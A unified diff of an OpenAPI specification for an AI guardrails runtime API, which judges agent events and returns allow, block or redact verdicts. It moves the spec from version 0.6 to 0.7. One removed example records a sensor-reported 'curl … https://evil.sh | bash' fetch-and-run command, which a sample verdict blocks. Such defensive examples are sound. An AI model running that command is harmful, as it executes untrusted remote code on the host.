@@ -7,29 +7,32 @@ openapi: 3.1.0
 
 info:
   title: OpenGuardrails Runtime API
-  version: "0.6"
-  summary: The HTTP wire contract between an OGR runtime (PDP) and its interception points (PEPs).
+  version: "0.7"
+  summary: The HTTP wire contract between an OGR runtime (PDP) and its integration points (PEPs).
   description: |
     The OpenGuardrails (OGR) Runtime API is the normative HTTP binding of the
     OGR contract: the API a runtime (Policy Decision Point) exposes and an
-    interception point (Policy Enforcement Point, PEP) or SDK calls. A PEP
-    submits `GuardEvent`s — units observed at an interception point
-    (conversation, invocation, or execution altitude) — and receives
-    `Verdict`s: allow, block, require_approval, modify, or redact.
+    integration point (Policy Enforcement Point, PEP) calls. There is no SDK
+    layer — this API is the integration surface, and the two integration
+    recipes (agent-direct and gateway) are written against it in the
+    specification.
+
+    The observed plane is LLM messages. A session is a ledger of steps: one
+    step is one model call, reported as two events — `step/request` (what is
+    about to be sent) and `step/response` (what came back, before the agent
+    acts on it) — plus an optional `turn/end` mark closing an instruction.
 
     Two data paths exist. `POST /v1/evaluate` is the synchronous decision
     path: one event in, one verdict out, called while the PEP is holding an
     action. `POST /v1/ingest` is the asynchronous observation path: batches
-    of events that need no synchronous decision. The remaining endpoints
-    handle sensor enrollment (Ed25519 key binding), PEP liveness, the
-    degraded-mode configuration a PEP applies when the runtime is
-    unreachable, human-approval polling, and health.
+    of events that need no synchronous decision (turn/end marks, the whole
+    answer after a streamed judgment). The remaining endpoints are PEP
+    liveness and health.
 
     All requests and responses are JSON, UTF-8,
     `Content-Type: application/json`. Field names on the wire are
     `snake_case`, exactly as in the JSON Schemas. The canonical schema
-    version is `ogr_version: "0.6"`; a runtime SHOULD accept events from
-    `0.1` through the current version and normalize on read.
+    version is `ogr_version: "0.7"`.
 
     Hosted reference documentation: https://openguardrails.com/api/docs/
     Normative specification:
@@ -58,183 +61,76 @@ servers:
     variables:
       host:
         default: ogr.example.com
-        description: Hostname (and optional port) of the OGR runtime deployment.
 
 security:
-  - workspaceKey: []
+  - orgApiKey: []
 
 tags:
-  - name: events
-    description: "The two data paths: synchronous decisions (`evaluate`) and asynchronous observation (`ingest`)."
-  - name: fleet
-    description: "Sensor identity and liveness: Ed25519 enrollment and PEP heartbeats."
-  - name: policy
-    description: "Policy-side reads: degraded-mode configuration and human-approval polling."
-  - name: health
-    description: Unauthenticated runtime liveness.
+  - name: decisions
+    description: The synchronous decision path.
+  - name: observations
+    description: The asynchronous observation path.
+  - name: liveness
+    description: Integration liveness and runtime health.
 
 paths:
   /v1/evaluate:
     post:
-      operationId: evaluateEvent
-      tags: [events]
-      summary: Evaluate one GuardEvent synchronously and return a Verdict.
+      tags: [decisions]
+      operationId: evaluate
+      summary: Judge one event and return one verdict.
       description: |
-        The synchronous decision path: one `GuardEvent` in, one `Verdict`
-        out. A PEP calls this when it is holding an action and needs a
-        decision before letting it proceed. The request is a single
-        GuardEvent object — not a batch; batching belongs to `/v1/ingest`.
-        The runtime MUST validate the body against the GuardEvent schema and
-        MAY accept the documented request extension fields (`run_id`,
-        `turn`, `authz`); unknown extensions MUST be ignored, not rejected.
+        One `GuardEvent` in, one `Verdict` out. A PEP calls this while
+        holding an action: the step's request before the model call, or the
+        step's response before executing what the model asked for.
 
-        **Side effect** — a non-partial evaluate MUST also record the event
-        (as if ingested); clients MUST NOT send the same event to
-        `/v1/ingest` again.
+        A non-partial evaluate also RECORDS the event (as if ingested);
+        clients MUST NOT send the same event to `/v1/ingest` again.
 
-        **Failure handling** — if the call fails (timeout, 429, 5xx,
-        network), the PEP applies its degraded-mode policy from
-        its locally configured degraded-mode policy; it MUST NOT default to allow for gated categories.
+        On failure (timeout, 429, 5xx, network) the PEP applies its locally
+        configured fail mode per category; it MUST NOT default to allow for
+        gated categories.
       parameters:
-        - name: ogr-partial
-          in: header
+        - in: header
+          name: ogr-partial
           required: false
           schema:
             type: string
             enum: ["1"]
           description: |
-            Marks an **interim** judgment: decide, answer, record nothing.
-            It exists for a PEP judging a *streamed* model answer: the
-            growing answer is submitted several times so the rest of a bad
-            stream can be stopped mid-flight. Those calls are one event seen
-            at several sizes, not several events; recording each would
-            multiply findings and session risk. A partial call MUST be
-            judged under the same policies, whitelists and fail modes as a
-            full call — the header suppresses the *writes*, never changes
-            the *decision*. The PEP MUST report the final answer once,
-            whole, through `/v1/ingest` when the stream ends.
-        - $ref: "#/components/parameters/OgrBatchSignature"
+            Marks an interim judgment of a growing streamed answer: decide,
+            answer, record nothing. Judged under the same policies,
+            whitelists and fail modes as a full call — the header suppresses
+            the writes, never changes the decision. The PEP MUST report the
+            final answer once, whole, through `/v1/ingest` when the stream
+            ends.
       requestBody:
         required: true
         content:
           application/json:
             schema:
-              $ref: "#/components/schemas/GuardEventExt"
-            examples:
-              execBlock:
-                summary: Kernel sensor reporting a curl-pipe-to-bash exec
-                value:
-                  ogr_version: "0.6"
-                  timestamp: "2026-08-11T09:30:00Z"
-                  observation_point: execution
-                  sensor_id: ogr.ebpf.sensor
-                  sensor_type: kernel
-                  kind: exec
-                  agent_id: build-agent-3
-                  payload: { argv: ["curl", "-fsSL", "https://evil.sh", "|", "bash"] }
+              $ref: "#/components/schemas/GuardEvent"
       responses:
         "200":
-          description: |
-            The runtime's `Verdict` for the submitted event. The runtime MAY
-            add extension keys (`x.ogr.*`, or `x.<vendor>.*` for vendors);
-            clients MUST pass through keys they do not understand. Notable
-            extension keys:
-
-            - `x.ogr.session_id` — the session the runtime attributed the
-              event to.
-            - `x.ogr.redaction_map` — present when the decision involves
-              redaction the PEP must apply.
-            - `x.ogr.output_mode` — `buffer` | `stream`: which lane the
-              runtime selected for judging a streamed output.
-            - `x.ogr.unjudged` — payload paths this verdict could *not*
-              judge. Absent or empty means every routed text was judged; a
-              PEP with `fail_mode: closed` MUST treat a non-empty value as
-              "could not look", which is not "found nothing".
+          description: The verdict.
           content:
             application/json:
               schema:
                 $ref: "#/components/schemas/Verdict"
-              examples:
-                block:
-                  summary: Block with session attribution (x.ogr.session_id)
-                  value:
-                    ogr_version: "0.6"
-                    event_id: evt_01J9ZK7Q2M
-                    guard_id: evt_01J9ZK7Q2M
-                    provider: runtime
-                    decision: block
-                    reasons: [security.exec.remote_script_pipe]
-                    categories:
-                      - id: security.exec.remote_script_pipe
-                        domain: security
-                        score: 0.97
-                    findings:
-                      - category: security.exec.remote_script_pipe
-                        severity: critical
-                        detector: exec-rules
-                    x.ogr.session_id: sess_01HZX
-                redact:
-                  summary: Redact with a redaction map the PEP must apply
-                  value:
-                    ogr_version: "0.6"
-                    event_id: evt_01J9ZK8R3N
-                    guard_id: evt_01J9ZK8R3N
-                    provider: runtime
-                    decision: redact
-                    reasons: [privacy.pii.email]
-                    categories:
-                      - id: privacy.pii.email
-                        domain: privacy
-                        score: 0.91
-                    modifications:
-                      kind: redact
-                      spans:
-                        - path: /payload/text
-                          start: 42
-                          end: 63
-                          operator: mask
-                    x.ogr.session_id: sess_01HZX
-                    x.ogr.redaction_map:
-                      /payload/text: [[42, 63]]
-                streamedAllow:
-                  summary: Allow on a streamed output, with lane selection and unjudged paths
-                  value:
-                    ogr_version: "0.6"
-                    event_id: evt_01J9ZK9S4P
-                    guard_id: evt_01J9ZK9S4P
-                    provider: runtime
-                    decision: allow
-                    x.ogr.session_id: sess_01HZX
-                    x.ogr.output_mode: stream
-                    x.ogr.unjudged: [/payload/attachments/0]
-        "400":
-          $ref: "#/components/responses/InvalidEvent"
-        "401":
-          $ref: "#/components/responses/Unauthorized"
-        "429":
-          $ref: "#/components/responses/RateLimited"
+        "400": { $ref: "#/components/responses/InvalidEvent" }
+        "401": { $ref: "#/components/responses/Unauthorized" }
+        "429": { $ref: "#/components/responses/RateLimited" }
 
   /v1/ingest:
     post:
-      operationId: ingestEvents
-      tags: [events]
-      summary: Record a batch of GuardEvents asynchronously.
+      tags: [observations]
+      operationId: ingest
+      summary: Record a batch of events that need no synchronous decision.
       description: |
-        The asynchronous observation path: record events that need no
-        synchronous decision (transcript, telemetry, the whole answer after
-        a streamed judgment). 1–100 events per request; each element is
-        validated independently against the GuardEvent schema, and the
-        documented request extension fields (`run_id`, `turn`, `authz`) are
-        accepted.
-
-        Event ids are assigned by the runtime at ingress and returned in
-        the per-element `results` rows (order preserved — order IS the
-        pairing). There is no request deduplication: retrying a timed-out
-        batch MAY produce duplicate records. Events arriving through ingest
-        without a valid `ogr-batch-signature` are capped at the
-        `self_declared` attestation ceiling.
-      parameters:
-        - $ref: "#/components/parameters/OgrBatchSignature"
+        1–100 events per request; each element validated independently.
+        `results` preserves request order — order IS the pairing. There is no
+        request deduplication: a client retrying a timed-out batch MAY
+        produce duplicate records, which observability data tolerates.
       requestBody:
         required: true
         content:
@@ -242,28 +138,17 @@ paths:
             schema:
               type: object
               required: [batch]
+              additionalProperties: false
               properties:
                 batch:
                   type: array
                   minItems: 1
                   maxItems: 100
                   items:
-                    $ref: "#/components/schemas/GuardEventExt"
-                  description: 1–100 GuardEvents, each validated independently.
-            example:
-              batch:
-                - ogr_version: "0.6"
-                  timestamp: "2026-08-11T09:31:00Z"
-                  observation_point: conversation
-                  kind: model_output
-                  agent_id: build-agent-3
-                  payload: { text: "Here is the full streamed answer..." }
+                    $ref: "#/components/schemas/GuardEvent"
       responses:
         "207":
-          description: |
-            Always returned when the envelope itself is well-formed, even if
-            every element failed. `results` preserves request order; each
-            entry reports one event's outcome.
+          description: Per-element results, in request order.
           content:
             application/json:
               schema:
@@ -273,118 +158,55 @@ paths:
                   results:
                     type: array
                     items:
-                      $ref: "#/components/schemas/IngestResult"
-                    description: Per-event outcomes, in request order.
-              example:
-                results:
-                  - id: evt_1
-                    status: 201
-                  - id: evt_2
-                    status: 400
-                    error: "timestamp: invalid datetime"
-        "400":
-          description: 'Malformed envelope (e.g. missing `batch`, not JSON, or batch size out of range).'
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/Error"
-              example:
-                error: invalid_body
-        "401":
-          $ref: "#/components/responses/Unauthorized"
-        "429":
-          $ref: "#/components/responses/RateLimited"
-
-  /v1/enroll:
-    post:
-      operationId: enrollKey
-      tags: [fleet]
-      summary: Bind a PEP's Ed25519 public key to the organization.
-      description: |
-        Binds a PEP's Ed25519 key to the organization so its future requests
-        can carry a verifiable identity via the `ogr-batch-signature`
-        detached-JWS header, raising the channel's attestation ceiling. The
-        organization API key is the bootstrap credential. Re-enrolling the same
-        key is idempotent (returns `200`); a revoked key MUST NOT be
-        resurrectable by re-enrolling (returns `403`).
-      requestBody:
-        required: true
-        content:
-          application/json:
-            schema:
-              $ref: "#/components/schemas/EnrollRequest"
-            example:
-              public_key: 8fT1nJc2sT3v1sJH1sYQe7rW1o0xCbBqvNQm9Yv2ZkQ
-              pep_id: pep_7a41
-              name: build-agent-3 eBPF sensor
-      responses:
-        "201":
-          description: First enrollment of this public key in the organization.
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/EnrollCreated"
-              example:
-                pep_id: pep_7a41
-                key_id: key_01J8
-                max_attestation: sensor_attested
-        "200":
-          description: Idempotent re-enrollment of a key already bound to this organization.
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/EnrollExisting"
-              example:
-                pep_id: pep_7a41
-                key_id: key_01J8
-        "400":
-          description: The submitted key is not a valid base64url raw 32-byte Ed25519 public key.
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/Error"
-              example:
-                error: invalid_public_key
-        "403":
-          description: The enrolled key exists but was revoked; revoked keys cannot be re-enrolled.
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/Error"
-              example:
-                error: key_revoked
-        "401":
-          $ref: "#/components/responses/Unauthorized"
-        "429":
-          $ref: "#/components/responses/RateLimited"
+                      type: object
+                      required: [id, status]
+                      properties:
+                        id:
+                          type: [string, "null"]
+                          description: Runtime-assigned event_id of the accepted element, null for a rejected one.
+                        status:
+                          type: integer
+                        error:
+                          type: string
+        "400": { $ref: "#/components/responses/InvalidEvent" }
+        "401": { $ref: "#/components/responses/Unauthorized" }
+        "429": { $ref: "#/components/responses/RateLimited" }
 
   /v1/heartbeat:
     post:
+      tags: [liveness]
       operationId: heartbeat
-      tags: [fleet]
-      summary: Report PEP liveness.
+      summary: Integration liveness over the authenticated channel.
       description: |
-        PEP liveness over the authenticated channel, so the runtime can
-        distinguish "agent idle" from "PEP went dark". Transport-level: a
-        heartbeat is **not** a GuardEvent and carries no guarded action. A
-        heartbeat MUST register a live-but-idle agent so fleet coverage
-        reflects enrolled PEPs that have not yet emitted an event.
+        Lets the runtime distinguish "agent idle" from "integration went
+        dark". Transport-level: a heartbeat is not a GuardEvent and carries
+        no guarded action. A heartbeat MUST register a live-but-idle agent so
+        fleet coverage reflects integrations that have not yet emitted an
+        event.
       requestBody:
         required: true
         content:
           application/json:
             schema:
-              $ref: "#/components/schemas/HeartbeatRequest"
-            example:
-              sensor_id: ogr.higress
-              sensor_type: proxy
-              sensor_version: 0.3.1
-              agent_id: build-agent-3
-              interval_s: 30
-              counters: { events_sent: 120, evaluate_errors: 0 }
+              type: object
+              additionalProperties: false
+              minProperties: 1
+              properties:
+                integration:
+                  type: string
+                  description: The reporting integration and build, e.g. "ogr-higress/0.4.1".
+                agent_id:
+                  type: string
+                interval_s:
+                  type: integer
+                  minimum: 1
+                counters:
+                  type: object
+                  additionalProperties:
+                    type: number
       responses:
         "200":
-          description: Heartbeat recorded.
+          description: Acknowledged.
           content:
             application/json:
               schema:
@@ -393,92 +215,16 @@ paths:
                 properties:
                   ok:
                     type: boolean
-                    const: true
-              example:
-                ok: true
-        "400":
-          description: Malformed heartbeat (neither `sensor_id` nor `agent_id` present, or not JSON).
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/Error"
-              example:
-                error: invalid_body
-        "401":
-          $ref: "#/components/responses/Unauthorized"
-        "429":
-          $ref: "#/components/responses/RateLimited"
-
-  /v1/approvals:
-    get:
-      operationId: getApproval
-      tags: [policy]
-      summary: Poll the human decision behind a require_approval verdict.
-      description: |
-        Polls the human decision behind a `require_approval` verdict, so a
-        blocking hook can wait for the approval to resolve before releasing
-        or discarding the held action.
-      parameters:
-        - name: guard_id
-          in: query
-          required: true
-          schema:
-            type: string
-            minLength: 1
-          description: The `guard_id` whose pending approval request is being polled.
-      responses:
-        "200":
-          description: The current state of the matching approval request.
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/ApprovalStatus"
-              examples:
-                pending:
-                  summary: Still waiting on a human
-                  value:
-                    status: pending
-                approved:
-                  summary: Approved, with decision time
-                  value:
-                    status: approved
-                    decided_at: "2026-08-11T09:35:12Z"
-        "400":
-          description: The required `guard_id` query parameter is missing.
-          content:
-            application/json:
-              schema:
-                $ref: "#/components/schemas/Error"
-              example:
-                error: invalid_body
-        "404":
-          description: No approval request matches the given `guard_id`.
-          content:
-            application/json:
-              schema:
-                type: object
-                required: [status]
-                properties:
-                  status:
-                    type: string
-                    const: not_found
-              example:
-                status: not_found
-        "401":
-          $ref: "#/components/responses/Unauthorized"
-        "429":
-          $ref: "#/components/responses/RateLimited"
+        "400": { $ref: "#/components/responses/InvalidBody" }
+        "401": { $ref: "#/components/responses/Unauthorized" }
+        "429": { $ref: "#/components/responses/RateLimited" }
 
   /v1/health:
     get:
-      operationId: getHealth
-      tags: [health]
-      summary: Unauthenticated runtime liveness.
-      description: |
-        Unauthenticated liveness: `200` when the runtime can serve
-        decisions, `503` otherwise. The only endpoint that does not require
-        a workspace API key.
+      tags: [liveness]
+      operationId: health
       security: []
+      summary: Unauthenticated runtime liveness.
       responses:
         "200":
           description: The runtime can serve decisions.
@@ -493,12 +239,8 @@ paths:
                     const: ok
                   version:
                     type: string
-                    description: Runtime software version.
-              example:
-                status: ok
-                version: 0.4.2
         "503":
-          description: The runtime cannot currently serve decisions; clients apply degraded mode.
+          description: The runtime cannot serve decisions.
           content:
             application/json:
               schema:
@@ -508,787 +250,72 @@ paths:
                   status:
                     type: string
                     const: error
-                additionalProperties: true
-              example:
-                status: error
-                detail: policy store unavailable
 
 components:
   securitySchemes:
-    workspaceKey:
+    orgApiKey:
       type: http
       scheme: bearer
-      bearerFormat: ogr_...
       description: |
-        Organization API key: `Authorization: Bearer ogr_<key>`. The key
+        Organization API key (`Authorization: Bearer ogr_<key>`). The key
         proves the ORGANIZATION — the tenant boundary every asserted name is
-        resolved inside. Where an event lands is the agent's business
-        (placement, then the asserted `agent_workspace`, then the key's default
-        workspace as last resort). A missing or invalid key produces
-        `401 {"error": "unauthorized"}`. The static key authenticates the
-        *channel*, not the *sensor*: events arriving with only the workspace
-        key are capped at the channel's attestation ceiling. An enrolled PEP
-        raises that ceiling per request with the `ogr-batch-signature`
-        header. A runtime SHOULD rate-limit per API key (reference default:
-        600 requests/minute, fixed window).
-
-        The key is also the identity floor: for events asserting no
-        `agent_id`, the runtime derives
-        an `agent_id` from the key — one key, one default agent — places
-        that agent in the key's workspace, and attributes every session to
-        one user.
-
-  parameters:
-    OgrBatchSignature:
-      name: ogr-batch-signature
-      in: header
-      required: false
-      schema:
-        type: string
-      description: |
-        Detached compact JWS (RFC 7515 Appendix F) over the exact raw
-        request body bytes, with protected header
-        `{"alg": "EdDSA", "kid": "<key_id from enroll>", "b64": false,
-        "crit": ["b64"]}`. The runtime MUST verify the signature against the
-        Ed25519 public key enrolled via `POST /v1/enroll`; a valid signature
-        raises the channel's attestation ceiling for the events in that
-        request. An absent or invalid signature MUST NOT reject the request
-        — the events land at the unenrolled floor.
+        resolved inside — and is the identity floor: a caller asserting no
+        identity fields is still fully attributable (agent derived from the
+        key, sessions derived, the key's workspace).
 
   responses:
-    Unauthorized:
-      description: Missing or invalid organization API key.
-      content:
-        application/json:
-          schema:
-            $ref: "#/components/schemas/Error"
-          example:
-            error: unauthorized
-    RateLimited:
-      description: |
-        Rate limit exhausted for this API key. Clients SHOULD back off and
-        MUST treat a 429 on `/v1/evaluate` like an unreachable runtime —
-        i.e. apply degraded mode, not fail open.
-      content:
-        application/json:
-          schema:
-            $ref: "#/components/schemas/Error"
-          example:
-            error: rate_limited
-            limit: 600
     InvalidEvent:
-      description: The body failed GuardEvent schema validation; `details` lists per-field issues.
+      description: Body failed schema validation.
       content:
         application/json:
           schema:
-            $ref: "#/components/schemas/Error"
-          example:
-            error: invalid_event
-            details: ["timestamp: invalid datetime"]
+            type: object
+            required: [error]
+            properties:
+              error:
+                type: string
+                const: invalid_event
+              details:
+                type: array
+                items:
+                  type: string
+    InvalidBody:
+      description: Malformed request.
+      content:
+        application/json:
+          schema:
+            type: object
+            required: [error]
+            properties:
+              error:
+                type: string
+    Unauthorized:
+      description: Missing or invalid API key.
+      content:
+        application/json:
+          schema:
+            type: object
+            required: [error]
+            properties:
+              error:
+                type: string
+                const: unauthorized
+    RateLimited:
+      description: Rate limit exhausted. Clients back off and treat a 429 on /v1/evaluate like an unreachable runtime (apply the local fail mode, never fail open on gated categories).
+      content:
+        application/json:
+          schema:
+            type: object
+            required: [error, limit]
+            properties:
+              error:
+                type: string
+                const: rate_limited
+              limit:
+                type: integer
 
   schemas:
-    RedactionSpan:
-      type: object
-      description: One span already redacted in the payload before submission.
-      required: [path, start, end]
-      additionalProperties: false
-      properties:
-        path:
-          type: string
-          description: JSON-pointer-like path to the redacted text within `payload`.
-        start:
-          type: integer
-          minimum: 0
-          description: Start offset of the redacted span.
-        end:
-          type: integer
-          minimum: 0
-          description: End offset of the redacted span.
-        category:
-          type: string
-          pattern: "^(safety|security|privacy|x)\\.[a-z0-9_.]+$"
-          description: Taxonomy category that motivated the redaction.
-        operator:
-          type: string
-          enum: [replace, mask, hash, encrypt]
-          description: How the span was transformed.
-        ref:
-          type: string
-          description: Opaque reference to recover or correlate the original content.
-
-    ProvenanceEntry:
-      type: object
-      description: Where a piece of the event's content came from, and how much it is trusted.
-      required: [source, trust]
-      additionalProperties: false
-      properties:
-        source:
-          type: string
-          enum: [system, user, model, tool_result, web, mcp, file, retrieved]
-          description: Origin of the content.
-        trust:
-          type: string
-          enum: [trusted, untrusted, unverified]
-          description: Trust level assigned to that origin.
-        ref:
-          type: string
-          description: Path or identifier of the content this entry covers.
-        taint_tags:
-          type: array
-          items:
-            type: string
-          description: Free-form taint labels propagated with the content.
-
     GuardEvent:
-      type: object
-      description: |
-        A unit observed at an OGR interception point. This is the closed
-        canonical object exactly as published in
-        `schema/guard-event.schema.json` (`additionalProperties: false`).
-        For the request bodies of `/v1/evaluate` and `/v1/ingest`, which
-        additionally accept the sanctioned runtime request extensions, see
-        `GuardEventExt`.
-      required:
-        - kind
-        - payload
-      additionalProperties: false
-      properties:
-        ogr_version:
-          type: string
-          const: "0.6"
-          description: Canonical schema version. Absent = the current version.
-        guard_id:
-          type: string
-          minLength: 1
-          description: >-
-            Correlation HINT: stable across observation points for one
-            logical action, sent only by deployments that propagate a
-            guard-context. Absent, the runtime assigns one (returned on the
-            verdict) and correlates altitudes server-side. There is no
-            client-supplied event_id at all — event identity is born at the
-            runtime and returned to the caller.
-        session_id:
-          type: string
-          description: Client-side session attribution, if the PEP knows it.
-        timestamp:
-          type: string
-          format: date-time
-          description: >-
-            When the unit was OBSERVED (RFC 3339). Absent = the runtime's
-            receive time; only buffered/replayed events need it.
-        observation_point:
-          type: string
-          enum: [conversation, invocation, execution]
-          description: >-
-            The altitude the event was observed at — what the sensor could
-            see, orthogonal to `sensor.class`. Absent, the runtime defaults
-            it from `kind` (llm_request/llm_response/user_input/model_output →
-            conversation; tool_call/tool_result/agent_spawn → invocation;
-            exec/network/file → execution).
-        kind:
-          type: string
-          enum:
-            - llm_request
-            - llm_response
-            - user_input
-            - model_output
-            - tool_call
-            - tool_result
-            - exec
-            - network
-            - file
-            - agent_spawn
-          description: >-
-            What kind of unit was observed. `llm_request`/`llm_response` are
-            the developer path: the untouched provider body, classified by
-            the runtime. The rest are the sensor path — facts the LLM wire
-            cannot show.
-        llm_protocol:
-          type: ["string", "null"]
-          enum: [openai.chat, openai.responses, anthropic.messages, null]
-          description: The LLM wire protocol the payload was captured from, when applicable.
-        agent_id:
-          type: string
-          minLength: 1
-          description: >-
-            The acting agent, unique within the organization. Behind a gateway
-            the authenticated caller id is the natural value. Absent, the
-            runtime derives an id from the API key (the identity floor).
-        agent_type:
-          type: string
-          description: >-
-            What kind of agent — the harness (`hermes`, `openclaw`) or the
-            deployment's own name for it (`smartwork`). A label, not an
-            identity: a second value for one agent_id raises the shadow-agent
-            signal, never a fork of the inventory.
-        agent_workspace:
-          type: string
-          description: >-
-            The named group of AGENTS this one belongs to, resolved only
-            inside the tenant the key proves. Absent, the key's workspace.
-        agent_owner:
-          type: string
-          description: The agent's builder / responsible party. An attribute, never a policy boundary.
-        agent_user:
-          type: string
-          description: Who is using the agent THIS session. Absent, every session is one user.
-        sandbox_id:
-          type: string
-          description: Sandbox instance the agent runs in, if any.
-        parent_agent_id:
-          type: string
-          description: Spawning agent, for sub-agents.
-        delegation_chain:
-          type: array
-          items:
-            type: string
-          description: Agent ids from root to this agent, for delegated work.
-        attestation:
-          type: string
-          enum: [self_declared, inferred, network, mtls, gateway_api_key, client_key]
-          description: >-
-            How the PEP verified the identity fields; clamped by the runtime
-            to the channel's attestation ceiling.
-        sensor_id:
-          type: string
-          minLength: 1
-          description: Stable id of the reporting integration, e.g. `ogr.ebpf.sensor`.
-        sensor_type:
-          type: string
-          enum: [in_process, wrapper, proxy, kernel]
-          description: >-
-            How evadable the observer is, weakest first. Absent, consumers
-            MUST treat the sensor as bypassable.
-        sensor_version:
-          type: string
-          description: Sensor software version, for triaging a bad rollout.
-        payload:
-          type: object
-          description: >-
-            The observed content itself; shape depends on `kind` (e.g.
-            `{"argv": [...]}` for `exec`, `{"text": "..."}` for
-            conversation kinds).
-        content_encoding:
-          type: string
-          enum: [raw, redacted, hashed, metadata_only]
-          default: raw
-          description: How much of the original content the payload carries.
-        redactions:
-          type: array
-          items:
-            $ref: "#/components/schemas/RedactionSpan"
-          description: Spans already redacted client-side before submission.
-        context_refs:
-          type: array
-          items:
-            type: string
-          description: References to prior events or external context this event depends on.
-        provenance:
-          type: array
-          items:
-            $ref: "#/components/schemas/ProvenanceEntry"
-          description: Origins and trust levels of the content in `payload`.
-
-    # GuardEventExt cannot be expressed as `allOf: [GuardEvent, {...extras}]`:
-    # GuardEvent is closed with `additionalProperties: false`, so any allOf
-    # composition would still reject `run_id` / `turn` / `authz` at the
-    # GuardEvent branch. It is therefore a standalone schema repeating every
-    # GuardEvent property plus the sanctioned runtime request extensions.
-    GuardEventExt:
-      type: object
-      description: |
-        A `GuardEvent` as accepted on the wire by `POST /v1/evaluate` and
-        `POST /v1/ingest`: the canonical closed GuardEvent plus the
-        sanctioned runtime request extensions (`run_id`, `turn`, `authz`).
-        A runtime MUST ignore unknown extension fields rather than reject
-        them, so this request shape is open (`additionalProperties: true`)
-        even though the canonical GuardEvent schema is closed.
-      required:
-        - kind
-        - payload
-      additionalProperties: true
-      properties:
-        ogr_version:
-          type: string
-          const: "0.6"
-          description: Canonical schema version. Absent = the current version.
-        guard_id:
-          type: string
-          minLength: 1
-          description: >-
-            Correlation hint (see the canonical GuardEvent schema); absent,
-            the runtime assigns and returns one.
-        session_id:
-          type: string
-          description: Client-side session attribution, if the PEP knows it.
-        timestamp:
-          type: string
-          format: date-time
-          description: When the unit was observed (RFC 3339).
-        observation_point:
-          type: string
-          enum: [conversation, invocation, execution]
-          description: >-
-            The altitude the event was observed at — what the sensor could
-            see, orthogonal to `sensor.class`.
-        kind:
-          type: string
-          enum:
-            - llm_request
-            - llm_response
-            - user_input
-            - model_output
-            - tool_call
-            - tool_result
-            - exec
-            - network
-            - file
-            - agent_spawn
-          description: >-
-            What kind of unit was observed. `llm_request`/`llm_response` are
-            the developer path: the untouched provider body, classified by
-            the runtime. The rest are the sensor path — facts the LLM wire
-            cannot show.
-        llm_protocol:
-          type: ["string", "null"]
-          enum: [openai.chat, openai.responses, anthropic.messages, null]
-          description: The LLM wire protocol the payload was captured from, when applicable.
-        agent_id:
-          type: string
-          minLength: 1
-          description: >-
-            The acting agent, unique within the organization. Behind a gateway
-            the authenticated caller id is the natural value. Absent, the
-            runtime derives an id from the API key (the identity floor).
-        agent_type:
-          type: string
-          description: >-
-            What kind of agent — the harness (`hermes`, `openclaw`) or the
-            deployment's own name for it (`smartwork`). A label, not an
-            identity: a second value for one agent_id raises the shadow-agent
-            signal, never a fork of the inventory.
-        agent_workspace:
-          type: string
-          description: >-
-            The named group of AGENTS this one belongs to, resolved only
-            inside the tenant the key proves. Absent, the key's workspace.
-        agent_owner:
-          type: string
-          description: The agent's builder / responsible party. An attribute, never a policy boundary.
-        agent_user:
-          type: string
-          description: Who is using the agent THIS session. Absent, every session is one user.
-        sandbox_id:
-          type: string
-          description: Sandbox instance the agent runs in, if any.
-        parent_agent_id:
-          type: string
-          description: Spawning agent, for sub-agents.
-        delegation_chain:
-          type: array
-          items:
-            type: string
-          description: Agent ids from root to this agent, for delegated work.
-        attestation:
-          type: string
-          enum: [self_declared, inferred, network, mtls, gateway_api_key, client_key]
-          description: >-
-            How the PEP verified the identity fields; clamped by the runtime
-            to the channel's attestation ceiling.
-        sensor_id:
-          type: string
-          minLength: 1
-          description: Stable id of the reporting integration, e.g. `ogr.ebpf.sensor`.
-        sensor_type:
-          type: string
-          enum: [in_process, wrapper, proxy, kernel]
-          description: >-
-            How evadable the observer is, weakest first. Absent, consumers
-            MUST treat the sensor as bypassable.
-        sensor_version:
-          type: string
-          description: Sensor software version, for triaging a bad rollout.
-        payload:
-          type: object
-          description: >-
-            The observed content itself; shape depends on `kind` (e.g.
-            `{"argv": [...]}` for `exec`, `{"text": "..."}` for
-            conversation kinds).
-        content_encoding:
-          type: string
-          enum: [raw, redacted, hashed, metadata_only]
-          default: raw
-          description: How much of the original content the payload carries.
-        redactions:
-          type: array
-          items:
-            $ref: "#/components/schemas/RedactionSpan"
-          description: Spans already redacted client-side before submission.
-        context_refs:
-          type: array
-          items:
-            type: string
-          description: References to prior events or external context this event depends on.
-        provenance:
-          type: array
-          items:
-            $ref: "#/components/schemas/ProvenanceEntry"
-          description: Origins and trust levels of the content in `payload`.
-        run_id:
-          type: string
-          description: >-
-            Runtime request extension — authoritative run attribution from an
-            adapter that can observe the agent lifecycle.
-        turn:
-          type: integer
-          minimum: 0
-          description: >-
-            Runtime request extension — zero-based turn index within the run,
-            from an adapter that can observe the agent lifecycle.
-        authz:
-          type: object
-          description: >-
-            Runtime request extension — the authorization envelope judged in
-            auto-mode.
-
-    VerdictCategory:
-      type: object
-      description: One taxonomy category the detector matched, with an optional score.
-      required: [id, domain]
-      additionalProperties: false
-      properties:
-        id:
-          type: string
-          pattern: "^(safety|security|privacy|x)\\.[a-z0-9_.]+$"
-          description: Full category id from the OGR taxonomy (or an `x.` extension category).
-        domain:
-          type: string
-          enum: [safety, security, privacy]
-          description: Top-level taxonomy domain of the category.
-        score:
-          type: number
-          minimum: 0
-          maximum: 1
-          description: Detector's confidence for this category.
-
-    ModificationSpan:
-      type: object
-      description: One span the PEP must transform to apply a `modify`/`redact` decision.
-      required: [path]
-      properties:
-        path:
-          type: string
-          description: JSON-pointer-like path to the text within the event payload.
-        start:
-          type: integer
-          description: Start offset of the span.
-        end:
-          type: integer
-          description: End offset of the span.
-        replacement:
-          type: string
-          description: "Replacement text, for `operator: replace`."
-        operator:
-          type: string
-          enum: [replace, mask, hash, encrypt]
-          default: replace
-          description: How to transform the span.
-        ref:
-          type: string
-          description: Opaque reference correlating the transformation.
-
-    Modifications:
-      type: object
-      description: >-
-        The transformation the PEP must apply when `decision` is `modify` or
-        `redact`.
-      required: [kind]
-      properties:
-        kind:
-          type: string
-          enum: [redact, rewrite, constrain]
